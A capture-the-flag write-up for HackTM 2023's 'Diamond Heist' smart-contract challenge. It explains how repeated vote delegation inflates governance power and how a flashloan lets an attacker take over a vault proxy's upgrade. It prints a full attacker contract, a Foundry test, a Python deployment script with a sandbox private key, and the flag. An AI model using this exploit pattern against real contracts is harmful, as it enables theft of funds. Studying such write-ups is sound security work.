# HackTM CTF 2023 : Diamond Heist

## Description
```
Salty Pretzel Swap DAO has recently come out with their new flashloan vaults. They have deposited all of their 100 Diamonds in one of their vaults.

Your mission, should you choose to accept it, is to break the vault and steal all of the diamonds. This would be one of the greatest heists of all time.

This text will self-destruct in ten seconds. 

Good luck.

nc 34.141.16.87 30200
```

I solved this challenge locally in foundry during the CTF, however I don't have enough time to deploy the attacker contract on the actual network

The setup contract sent 100 diamond tokens to the vault initially, the objective is to steal the 100 diamond tokens from the vault and send them back to the setup contract

We are allowed to mint 100 ether of SaltyPretzel token using `claim()` in setup contract once

The vault is using a proxy and it has a `governanceCall()` function :
```solidity
    function governanceCall(bytes calldata data) external {
        require(msg.sender == owner() || saltyPretzel.getCurrentVotes(msg.sender) >= AUTHORITY_THRESHOLD);
        (bool success,) = address(this).call(data);
        require(success);
    }
```

We can use this function to call the vault on behalf of itself with any calldata we want, but in order to call this function, we have to first pass that require statement that `saltyPretzel.getCurrentVotes(msg.sender)` will return more than or equal to 10000 ether

We can use the 100 ether of SaltyPretzel tokens to vote, by calling `delegate()` on SaltyPretzel contract, however we need 10000 ether of votes in order to pass that require statement

The vulnerability is that if we transfer our SaltyPretzel token away after we vote, our vote remains, and the new recipient can vote again with the SaltyPretzel token we just sent

So, by doing that 100 times, we can get 10000 ether of votes and we can now call `governanceCall()` successfully

By reading `UUPSUpgradeable.sol`, the proxy can call `upgradeTo()` to upgrade the implementation, so we can use `governanceCall()` to upgrade the implementation to our attacker contract

The vault has overridden `_authorizeUpgrade()` :
```solidity
    function _authorizeUpgrade(address) internal override view {
        require(msg.sender == owner() || msg.sender == address(this));
        require(IERC20(diamond).balanceOf(address(this)) == 0);
    }
```

There are 2 require statements, the first one will be passed because we are calling as the proxy, and second one requires that the diamond token balance of itself is 0, we can achieve that with the flashloan feature

We can call `flashloan()` and send us all the diamond token it has, then when it calls `onFlashLoan()` on our attacker contract, we can call `governanceCall()` to call `upgradeTo()` on behalf of the proxy to make our attacker contract become the implementation of the vault proxy, finally return the diamond token back to the vault from our attacker contract

After our attacker contract become the implementation of the vault proxy, we can use the code on our attacker contract to transfer the diamond to the setup contract, and this challenge is solved

### Attacker contract
```solidity
pragma solidity ^0.8.13;

import "./Setup.sol";

contract Bot {
    // send back saltypretzel
    function sendToken(address token, address to) external {
        IERC20(token).transfer(to, 100 ether);
    }
    
    function delegate(address saltyPretzel) external {
        SaltyPretzel(saltyPretzel).delegate(msg.sender);
    }
}

contract Attacker {
    Bot bot;
    // send back diamond
    function sendToken(address token, address to) public {
        IERC20(token).transfer(to, 100);
    }
    
    function onFlashLoan(address, address diamond, uint256, uint256, bytes memory) external returns (bytes32) {
        Vault(msg.sender).governanceCall(abi.encodeWithSignature("upgradeTo(address)", address(this)));
        // pay back the loan
        IERC20(diamond).transfer(msg.sender, 100);
        return bytes32(0);
    }
    
    function exploit(address saltyPretzel, address vault, address diamond) public {
        // get 10000 ether vote
        for (uint i = 0; i < 100; i++) {
            bot = new Bot();
            SaltyPretzel(saltyPretzel).transfer(address(bot), 100 ether);
            bot.delegate(saltyPretzel);
            bot.sendToken(saltyPretzel, address(this));
        }
        Vault(vault).flashloan(diamond, 100, address(this));
    }
    
    function proxiableUUID() external view returns (bytes32) {
        return bytes32(hex"360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc");
    }
}
```

### Foundry test for the exploit
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Setup.sol";
import "../src/Attacker.sol";

contract DiamondHeist is Test {
    Setup setup;
    Vault vault;
    Diamond diamond;
    SaltyPretzel saltyPretzel;
    Attacker attacker;
    address owner = vm.addr(1);
    address hacker = vm.addr(2);
    
    
    function setUp() external {
        console.log("Owner : ", owner);
        console.log("Hacker : ", hacker);
        vm.prank(owner);
        setup = new Setup();
        vault = setup.vault();
        diamond = setup.diamond();
        saltyPretzel = setup.saltyPretzel();
    }

    function test() public {
        vm.startPrank(hacker);
        setup.claim();
        attacker = new Attacker();
        saltyPretzel.transfer(address(attacker), 100 ether);
        attacker.exploit(address(saltyPretzel), address(vault), address(diamond));
        console.log("Attacker contract current votes : ", saltyPretzel.getCurrentVotes(address(attacker)));
        Attacker(address(vault)).sendToken(address(diamond), address(setup));
        console.log("Setup isSolved : ", setup.isSolved());
    }
}
```

The foundry test passed :

```
# forge test --match-path test/diamont_heist.t.sol -vv 
[⠒] Compiling...
No files changed, compilation skipped

Running 1 test for test/diamont_heist.t.sol:DiamondHeist
[PASS] test() (gas: 18366763)
Logs:
  Owner :  0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf
  Hacker :  0x2B5AD5c4795c026514f8317c7a215E218DcCD6cF
  Attacker contract current votes :  10000000000000000000000
  Setup isSolved :  true

Test result: ok. 1 passed; 0 failed; finished in 16.87ms
```

Then we can deploy it on the actual network to solve it and get the flag

### Python script to deploy it
```python
from web3 import Web3, HTTPProvider
from web3.middleware import geth_poa_middleware
from solcx import compile_source
from eth_account import Account

web3 = Web3(HTTPProvider('http://34.141.16.87:30201/41a35057-c9c7-4e72-bb64-81bf59542459'))
web3.middleware_onion.inject(geth_poa_middleware, layer=0)

private_key = '0xcb5502af34c9bfa1e329344a5c9c0e8e1c593ec972d07e32974212cedf3ee79c'
wallet = Account.from_key(private_key).address

setupAddress = '0xd66F8309De71F8Ab401c0C107343ec27bE074b6A'

solFile = 'Attacker.sol'
compiled_sol = compile_source(open(solFile, 'r').read(), output_values=['abi', 'bin', 'bin-runtime'])

# Attacker contract
abi = compiled_sol[f'<stdin>:Attacker']['abi']
bytecode = compiled_sol[f'<stdin>:Attacker']['bin']

contract_instance = web3.eth.contract(abi=abi, bytecode=bytecode)

# Setup contract
setup_abi = compiled_sol['Setup.sol:Setup']['abi']
setup_instance = web3.eth.contract(address=setupAddress, abi=setup_abi)

# Get addresses from setup
saltyPretzel = setup_instance.functions.saltyPretzel().call()
vault = setup_instance.functions.vault().call()
diamond = setup_instance.functions.diamond().call()
print('SaltyPretzel : ', saltyPretzel)
print('Vault : ', vault)
print('Diamond : ', diamond)

# SaltyPretzel contract
saltyPretzel_abi = compiled_sol['SaltyPretzel.sol:SaltyPretzel']['abi']
saltyPretzel_instance = web3.eth.contract(address=saltyPretzel, abi=saltyPretzel_abi)

# Claim 100 ether of saltyPretzel token from setup
print('Claim 100 ether of saltyPretzel token from setup')
nonce = web3.eth.getTransactionCount(wallet)
gasPrice = web3.eth.gas_price
gasLimit = 1000000

tx = {
    'nonce': nonce,
    'gas': gasLimit,
    'gasPrice': gasPrice,
    'from': wallet
}

transaction = setup_instance.functions.claim().buildTransaction(tx)
signed_tx = web3.eth.account.sign_transaction(transaction, private_key)
tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction)
transaction_hash = web3.toHex(tx_hash)
tx_receipt = web3.eth.wait_for_transaction_receipt(transaction_hash)
print(tx_receipt['status'])

# Deploy attacker contract
print('Deploy attacker contract')
nonce = web3.eth.getTransactionCount(wallet)
gasPrice = web3.eth.gas_price
gasLimit = 10000000

tx = {
    'nonce': nonce,
    'gas': gasLimit,
    'gasPrice': gasPrice,
    'from': wallet
}

transaction = contract_instance.constructor().buildTransaction(tx)
signed_tx = web3.eth.account.sign_transaction(transaction, private_key)
tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction)
transaction_hash = web3.toHex(tx_hash)
tx_receipt = web3.eth.wait_for_transaction_receipt(transaction_hash)
print(tx_receipt['status'])


attackerAddress = tx_receipt.contractAddress
print(f"Contract deployed to {attackerAddress}")
contract_instance = web3.eth.contract(address=attackerAddress, abi=abi)

# Transfer 100 ether of saltyPretzel token to attacker contract
print('Transfer 100 ether of saltyPretzel token to attacker contract')
nonce = web3.eth.getTransactionCount(wallet)
gasPrice = web3.eth.gas_price
gasLimit = 1000000

tx = {
    'nonce': nonce,
    'gas': gasLimit,
    'gasPrice': gasPrice,
    'from': wallet
}

transaction = saltyPretzel_instance.functions.transfer(attackerAddress, web3.toWei(100, 'ether')).buildTransaction(tx)
signed_tx = web3.eth.account.sign_transaction(transaction, private_key)
tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction)
transaction_hash = web3.toHex(tx_hash)
tx_receipt = web3.eth.wait_for_transaction_receipt(transaction_hash)
print(tx_receipt['status'])


# Run exploit function on attacker contract
print('Run exploit function on attacker contract')
nonce = web3.eth.getTransactionCount(wallet)
gasPrice = web3.eth.gas_price
gasLimit = 30000000

tx = {
    'nonce': nonce,
    'gas': gasLimit,
    'gasPrice': gasPrice,
    'from': wallet
}

transaction = contract_instance.functions.exploit(saltyPretzel, vault, diamond).buildTransaction(tx)
signed_tx = web3.eth.account.sign_transaction(transaction, private_key)
tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction)
transaction_hash = web3.toHex(tx_hash)
tx_receipt = web3.eth.wait_for_transaction_receipt(transaction_hash)
print(tx_receipt['status'])

print('Attacker contract current votes :', saltyPretzel_instance.functions.getCurrentVotes(attackerAddress).call())


# Vault proxy upgraded as attacker contract send diamonds to setup to solve the challenge
contract_instance = web3.eth.contract(address=vault, abi=abi)

print('Vault proxy upgraded as attacker contract send diamonds to setup to solve the challenge')
nonce = web3.eth.getTransactionCount(wallet)
gasPrice = web3.eth.gas_price
gasLimit = 1000000

tx = {
    'nonce': nonce,
    'gas': gasLimit,
    'gasPrice': gasPrice,
    'from': wallet
}

transaction = contract_instance.functions.sendToken(diamond, setupAddress).buildTransaction(tx)
signed_tx = web3.eth.account.sign_transaction(transaction, private_key)
tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction)
transaction_hash = web3.toHex(tx_hash)
tx_receipt = web3.eth.wait_for_transaction_receipt(transaction_hash)
print(tx_receipt['status'])

# Check setup isSolved()
print('Setup isSolved() :', setup_instance.functions.isSolved().call())
```

```
# python3 deployExploit.py 
SaltyPretzel :  0x72F3e07384ed953B534b48a2c8BbEd99500aAB9f
Vault :  0xd3f255EeBAbf760781f63C3234c0d3871e470A30
Diamond :  0x873523d2e86BB1359e9cba9B85ce1dE9d3D2296b
Claim 100 ether of saltyPretzel token from setup
1
Deploy attacker contract
1
Contract deployed to 0x75595Fe2E99c2D303Ab7F7fCa7515c68368Ff3fD
Transfer 100 ether of saltyPretzel token to attacker contract
1
Run exploit function on attacker contract
1
Attacker contract current votes : 10000000000000000000000
Vault proxy upgraded as attacker contract send diamonds to setup to solve the challenge
1
Setup isSolved() : True
```

### Flag :
```
# nc 34.141.16.87 30200
1 - launch new instance
2 - kill instance
3 - get flag
action? 3
ticket please: 9dc45611677d6d562e7eea4efa42dc26e72b7cf6a4a02f773e363b2e1bd35c70
HackTM{m1ss10n_n0t_th4t_1mmut4ble_58fb67c04fd7fedc}
```